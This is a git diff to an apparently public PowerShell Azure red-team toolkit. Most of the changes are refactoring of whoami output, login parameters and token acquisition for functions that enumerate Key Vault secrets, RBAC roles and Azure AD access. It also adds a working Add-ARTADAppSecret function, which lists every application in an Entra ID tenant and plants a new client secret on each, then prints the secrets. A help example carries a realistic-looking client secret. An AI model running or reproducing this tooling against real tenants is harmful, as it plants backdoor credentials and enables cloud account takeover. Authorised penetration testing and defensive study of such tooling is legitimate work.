@@ -81,9 +81,10 @@ Function Get-ARTWhoami {
     Write-Host ""
 
     if((Get-Command Get-AzContext) -and ($All -or $Az)) {
+        
+        Write-Host "== Azure context (Az module):"
         try {
             $AzContext = Get-AzContext
-            Write-Host "== Azure context (Az module):"
 
             if($CheckToken) {
                 try {
@@ -99,14 +100,15 @@ Function Get-ARTWhoami {
 
         } catch {
             Write-Warning "[!] Not authenticated to Azure.`n"
+            Write-Host ""
         }
     }
 
     if((Get-Command Get-AzureADCurrentSessionInfo) -and ($All -or $AzureAD)) {
+        Write-Host "== Azure AD context (AzureAD module):"
+        
         try {
             $AzADCurrSess = Get-AzureADCurrentSessionInfo
-
-            Write-Host "== Azure AD context (AzureAD module):"
 
             if($CheckToken) {
                 try {
@@ -122,14 +124,15 @@ Function Get-ARTWhoami {
 
         } catch {
             Write-Warning "[!] Not authenticated to Azure AD.`n"
+            Write-Host ""
         }
     }
 
     if ((Get-Command Get-MGContext) -and ($All -or $MGraph)) {
+        Write-Host "== Microsoft Graph context (Microsoft.Graph module):"
+        
         try {
             $mgContext = Get-MGContext
-
-            Write-Host "== Microsoft Graph context (Microsoft.Graph module):"
 
             if($CheckToken) {
                 try {
@@ -150,17 +153,18 @@ Function Get-ARTWhoami {
 
         } catch {
             Write-Warning "[!] Not authenticated to Azure AD.`n"
+            Write-Host ""
         }
     }
 
     if($All -or $AzCli) {
+        Write-Host "== AZ CLI context:"
+        
         try {
             az account show | Out-Null
 
             try {
                 $AzAcc = az account show | convertfrom-json
-
-                Write-Host "== AZ CLI context:"
 
                 $Coll = New-Object System.Collections.ArrayList
                 
@@ -179,6 +183,7 @@ Function Get-ARTWhoami {
 
             } catch {
                 Write-Warning "[!] Not authenticated to AZ CLI.`n"
+                Write-Host ""
             }
         }
         catch {
@@ -309,8 +314,8 @@ Function Connect-ART {
     .PARAMETER TokenFromAzCli
         Use az cli to acquire fresh access token.
 
-    .PARAMETER Account
-        Specifies Azure portal Account name or Account ID.
+    .PARAMETER Username
+        Specifies Azure portal Account name, Account ID or Application ID.
 
     .PARAMETER Password
         Specifies Azure portal password.
@@ -323,10 +328,10 @@ Function Connect-ART {
         PS> Connect-ART -AccessToken 'eyJ0eXA...'
         
         Example 2: Authentication as a user to the Azure via Credentials:
-        PS> Connect-ART -Account test@test.onmicrosoft.com -Password Foobar123%
+        PS> Connect-ART -Username test@test.onmicrosoft.com -Password Foobar123%
 
-        Example 3: Authentication as a Service Principal to the Azure via Credentials - Client ID and Client Secret:
-        PS> Connect-ART -ServicePrincipal -Account e5a497f0-e696-11eb-b57b-00155d01ef0d -Password 'sfs~~dsdsfssdfsdfsd' -TenantId b413826f-108d-4049-8c11-d52d5d388768
+        Example 3: Authentication as a Service Principal using added Application Secret:
+        PS> Connect-ART -ServicePrincipal -Username f072c4a6-e696-11eb-b57b-00155d01ef0d -Password 'agq7Q~UZX5SYwxq2O7FNW~C_S1QNJcJrlLu.E' -TenantId b423726f-108d-4049-8c11-d52d5d388768
     #>
 
     [CmdletBinding(DefaultParameterSetName = 'Token')]
@@ -351,9 +356,9 @@ Function Connect-ART {
         [Switch]
         $TokenFromAzCli,
 
-        [Parameter(Mandatory=$False)]
+        [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
         [String]
-        $Account = $null,
+        $Username = $null,
 
         [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
         [String]
@@ -473,12 +478,19 @@ Function Connect-ART {
         else {
             $passwd = ConvertTo-SecureString $Password -AsPlainText -Force
             $creds = New-Object System.Management.Automation.PSCredential ($Username, $passwd)
-            
-            Write-Verbose "Azure authentication via provided creds..."
 
             if($ServicePrincipal) {
-                Connect-AzAccount -Credential $creds -ServicePrincipal -Tenant 
+
+                Write-Verbose "Azure authentication via provided Service Principal creds..."
+
+                if($TenantId -eq $null -or $TenantId.Length -eq 0) {
+                    throw "Tenant ID not provided! Pass it in -TenantId parameter."
+                }
+
+                Connect-AzAccount -Credential $creds -ServicePrincipal -Tenant $TenantId
+
             } Else {
+                Write-Verbose "Azure authentication via provided User creds..."
                 Connect-AzAccount -Credential $creds
             }
         }
@@ -934,6 +946,11 @@ Function Get-ARTAccessTokenAz {
 
         if($Resource -ne $null -and $Resource.Length -gt 0) {
             $token = (Get-AzAccessToken -Resource $Resource).Token
+
+            if ($token -eq $null -or $token.Length -eq 0) {
+                $APSUser = Get-AzContext *>&1 
+                $token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate($APSUser.Account, $APSUser.Environment, $APSUser.Tenant.Id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, $Resource).AccessToken
+            }
         }
         else {
             $token = (Get-AzAccessToken).Token
@@ -957,6 +974,7 @@ Function Get-ARTAccessTokenAz {
         $ErrorActionPreference = $EA
     }
 }
+
 
 #
 # SOURCE:
@@ -1125,7 +1143,7 @@ Function Get-ARTResource {
         Authenticates to the https://management.azure.com using provided Access Token and pulls accessible resources and permissions that token Owner have against them.
 
     .PARAMETER AccessToken
-        Specifies JWT Access Token for the https://management.azure.com resource.
+        Optional, specifies JWT Access Token for the https://management.azure.com resource.
 
     .PARAMETER SubscriptionId
         Optional parameter specifying which Subscription should be requested.
@@ -1155,7 +1173,7 @@ Function Get-ARTResource {
 
         if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
             Write-Verbose "Access Token not provided. Requesting one from Get-AzAccessToken ..."
-            $AccessToken = Get-ARTAccessTokenAz
+            $AccessToken = Get-ARTAccessTokenAz -Resource "https://management.azure.com"
         }
 
         if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
@@ -1173,7 +1191,8 @@ Function Get-ARTResource {
             Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
         }
 
-        $resource = $parsed.aud
+        #$resource = $parsed.aud
+        $resource = "https://management.azure.com"
 
         Write-Verbose "Will use resource: $resource"
 
@@ -1759,6 +1778,9 @@ Function Get-ARTKeyVaultSecrets {
     .EXAMPLE
         PS> Get-ARTKeyVaultSecrets
     #>
+    [CmdletBinding()]
+    Param(
+    )
     
     try {
         $EA = $ErrorActionPreference
@@ -1787,7 +1809,7 @@ Function Get-ARTKeyVaultSecrets {
             }
         }
 
-        $Coll
+        Return $Coll
     }
     catch {
         Write-Host "[!] Function failed!"
@@ -1896,6 +1918,8 @@ Function Get-ARTAccess {
 
         try {
             $res = Get-AzResource
+
+            Write-Verbose "Step 1. Checking accessible Azure Resources..."
             $res = Get-ARTResource
 
             if ($res -ne $null -and $res.Length -gt 0) {
@@ -1907,6 +1931,7 @@ Function Get-ARTAccess {
             }
 
             try {
+                Write-Verbose "Step 2. Checking assigned Azure RBAC Roles..."
                 $roles = Get-ARTRoleAssignment
                 if ($roles -ne $null -and $roles.Length -gt 0) {
                     Write-Host "[+] Azure RBAC Roles Assigned:"
@@ -1921,17 +1946,22 @@ Function Get-ARTAccess {
             }
 
             try {
+                Write-Verbose "Step 3. Checking accessible Azure Key Vault Secrets..."
                 $secrets = Get-ARTKeyVaultSecrets
 
-                if ($secrets -ne $null -and $secrets.Length -gt 0) {
+                if ($secrets -ne $null) {
                     Write-Host "[+] Azure Key Vault Secrets accessible:"
                     $secrets
+                }
+                else {
+                    Write-Verbose "[-] User could not access Key Vault Secrets or there were no available."
                 }
             }
             catch {
             }
 
             try {
+                Write-Verbose "Step 4. Checking access to Az.AD / AzureAD via Az module..."
                 $users = Get-AzADUser -ErrorAction SilentlyContinue
 
                 if ($users -ne $null -and $users.Length -gt 0) {
@@ -1987,7 +2017,9 @@ Function Get-ARTADAccess {
                 Return
             }
             
+            Write-Verbose "Step 1. Checking assigned Azure AD Roles..."
             $roles = Get-ARTADRoleAssignment
+
             if ($roles -ne $null -and $roles.Length -gt 0) {
                 Write-Host "[+] Azure AD Roles Assigned:"
                 $roles | ft
@@ -2030,10 +2062,10 @@ Function Get-ARTADAccess {
 }
 
 
-Function Invoke-ARTRESTMethod {
+Function Get-ARTRESTMethod {
     <#
     .SYNOPSIS
-        Invokes REST Method to the specified URI.
+        Invokes REST Method GET to the specified URI.
 
     .DESCRIPTION
         Takes Access Token and invokes REST method API request against a specified URI. It also verifies whether provided token has required audience set.
@@ -2048,7 +2080,7 @@ Function Invoke-ARTRESTMethod {
         Return results as JSON.
 
     .EXAMPLE
-        PS> Invoke-ARTRESTMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -AccessToken $token
+        PS> Get-ARTRESTMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -AccessToken $token
     #>
 
     [CmdletBinding()]
@@ -2072,8 +2104,8 @@ Function Invoke-ARTRESTMethod {
 
         $parsed = Parse-JWTtokenRT $AccessToken
 
-        $tokenhost = [System.Uri]($parsed.aud).Host
-        $requesthost = [System.Uri]($Uri).Host
+        $tokenhost = ([System.Uri]$parsed.aud).Host
+        $requesthost = ([System.Uri]$Uri).Host
 
         if($tokenhost -ne $requesthost) {
             Write-Warning "Request Host ($requesthost) differs from Token Audience host ($tokenhost). Authentication failure may occur."
@@ -2105,3 +2137,126 @@ Function Invoke-ARTRESTMethod {
         $ErrorActionPreference = $EA
     }
 }
+
+
+#
+# This function is (probably) authored by:
+#    Nikhil Mittal, @nikhil_mitt
+#    https://twitter.com/nikhil_mitt
+#
+# Code was taken from Nikhil's Azure Red Team Bootcamp:
+#   C:\AzAD\Tools\Add-AzADAppSecret.ps1
+#
+Function Add-ARTADAppSecret {
+    <#
+    .SYNOPSIS
+        Add client secret to the applications.
+
+    .PARAMETER AccessToken
+        Pass the Graph API Token.
+
+    .EXAMPLE
+        PS C:\> Add-ARTADAppSecret -AccessToken 'eyJ0eX..'
+
+    .LINK
+        https://twitter.com/nikhil_mitt
+        https://docs.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0&tabs=http
+        https://docs.microsoft.com/en-us/graph/api/application-addpassword?view=graph-rest-1.0&tabs=http
+    #>
+
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$True)]
+        [String]
+        $AccessToken = $null
+    )
+
+    try {
+        $EA = $ErrorActionPreference
+        $ErrorActionPreference = 'silentlycontinue'
+
+        $AppList = $null
+        $AppPassword = $null
+
+        $parsed = Parse-JWTtokenRT $AccessToken
+
+        $tokenhost = ([System.Uri]$parsed.aud).Host
+        $requesthost = "graph.microsoft.com"
+
+        if($tokenhost -ne $requesthost) {
+            Write-Warning "Supplied Access Token's Audience host `"$tokenhost`" is not `"https://graph.microsoft.com`"! Authentication failure may occur."
+        }
+
+        # List All the Applications
+        $Params = @{
+             "URI"     = "https://graph.microsoft.com/v1.0/applications"
+             "Method"  = "GET"
+             "Headers" = @{
+                "Content-Type"  = "application/json"
+                "Authorization" = "Bearer $AccessToken"
+            }
+        }
+
+        try { 
+            $AppList = Invoke-RestMethod @Params -UseBasicParsing
+        }
+        catch {
+        }
+
+        # Add Password in the Application
+        if($AppList -ne $null) {
+
+            [System.Collections.ArrayList]$Details = @()
+
+            foreach($App in $AppList.value) {
+                $ID = $App.ID
+                $psobj = New-Object PSObject
+
+                $Params = @{
+                    "URI"     = "https://graph.microsoft.com/v1.0/applications/$ID/addPassword"
+                    "Method"  = "POST"
+                    "Headers" = @{
+                        "Content-Type"  = "application/json"
+                        "Authorization" = "Bearer $AccessToken"
+                    }
+                }
+
+                $Body = @{
+                    "passwordCredential"= @{
+                        "displayName" = "Password"
+                    }
+                }
+     
+                try {
+                    $AppPassword = Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
+                    Add-Member -InputObject $psobj -NotePropertyName "Object ID" -NotePropertyValue $ID
+                    Add-Member -InputObject $psobj -NotePropertyName "App ID" -NotePropertyValue $App.appId
+                    Add-Member -InputObject $psobj -NotePropertyName "App Name" -NotePropertyValue $App.displayName
+                    Add-Member -InputObject $psobj -NotePropertyName "Key ID" -NotePropertyValue $AppPassword.keyId
+                    Add-Member -InputObject $psobj -NotePropertyName "Secret" -NotePropertyValue $AppPassword.secretText
+                    $Details.Add($psobj) | Out-Null
+                }
+                catch {
+                    Write-Output "Failed to add new client secret to '$($App.displayName)' Application." 
+                }
+            }
+
+            if($Details -ne $null) {
+                Write-Output "`nClient secret added to:" 
+                Write-Output $Details | fl *
+            }
+        }
+        else {
+           Write-Output "Failed to Enumerate the Applications."
+        }
+    }
+    catch {
+        Write-Host "[!] Function failed!"
+        Throw
+        Return
+    }
+    finally {
+        $ErrorActionPreference = $EA
+    }
+}
+
